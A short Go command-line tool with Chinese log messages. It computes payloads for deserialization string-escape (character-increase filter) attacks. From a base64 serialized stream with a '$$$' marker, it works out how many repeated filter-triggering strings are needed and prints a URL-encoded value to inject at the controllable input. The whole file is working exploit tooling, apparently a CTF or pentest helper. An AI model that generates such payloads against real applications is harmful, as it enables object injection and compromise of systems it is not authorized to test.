package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"log/slog"
	"net/url"
	"strings"
)

func main() {
	inputStram := flag.String("input", "", "base64编码的目标序列化流")
	src := flag.String("src", "", "被替换的字符串")
	dst := flag.String("dst", "", "替换后的字符串")
	flag.Parse()
	if *inputStram == "" || *src == "" || *dst == "" {
		slog.Error("Invalid")
	}
	input, err := base64.StdEncoding.DecodeString(*inputStram)
	if err != nil {
		slog.Error(err.Error())
	}
	slog.Info("[+] 目标序列化流： " + string(input))

	src_character := *src
	dst_character := *dst

	if len(src_character) < len(dst_character) {
		slog.Info("[+] 字符增多的情况")
		// 一个可控点即可控制
		diffLength := len(dst_character) - len(src_character)
		slog.Info(fmt.Sprintf("[+] 替换的字符长度差值为： %d", diffLength))
		temp := strings.Split(string(input), "$$$")
		requiredLength := len(temp[1])
		groupsNum, surplus := requiredLength/diffLength, requiredLength%diffLength
		slog.Info(fmt.Sprintf("[+] 需要 %d 组 %s, 差 %d 补齐", groupsNum, src_character, surplus))
		if surplus == 0 {
			output := url.QueryEscape(strings.Repeat(src_character, groupsNum) + temp[1])
			slog.Info("[+] 可控点需要传入的： " + output)
		} else {
			output := url.QueryEscape(strings.Repeat(src_character, groupsNum+1) + temp[1] + strings.Repeat(string(dst_character[0]), diffLength-surplus))
			slog.Info("[+] 可控点需要传入的： " + output)
		}

	}
}
